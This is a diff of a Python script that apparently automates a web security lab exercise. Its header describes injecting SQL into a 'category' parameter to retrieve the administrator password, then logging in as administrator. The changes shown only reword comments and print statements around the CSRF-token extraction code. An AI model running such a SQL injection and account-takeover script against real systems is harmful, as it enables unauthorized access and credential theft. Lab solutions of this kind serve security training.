@@ -9,7 +9,7 @@
 # Steps: 1. Inject payload into 'category' query parameter to retrieve administrator
 #           password from users table
 #        2. Fetch the login page
-#        3. Extract csrf token and session cookie
+#        3. Extract the csrf token and session cookie
 #        4. Login as the administrator
 #        5. Fetch the administrator profilele
 #
@@ -63,10 +63,10 @@ print(Fore.WHITE + "2. Fetching login page.. " + Fore.GREEN + "OK")
 # get session cookie
 session = fetch_login.cookies.get("session")
 
-# extract csrf token
+# Extract the csrf token
 csrf = re.findall("csrf.+value=\"(.+)\"", fetch_login.text)[0]
 
-print(Fore.WHITE + "3. Extracting csrf token and session cookie.. " + Fore.GREEN + "OK")
+print(Fore.WHITE + "3. Extracting the csrf token and session cookie.. " + Fore.GREEN + "OK")
 
 # data to send via POST  
 data = {
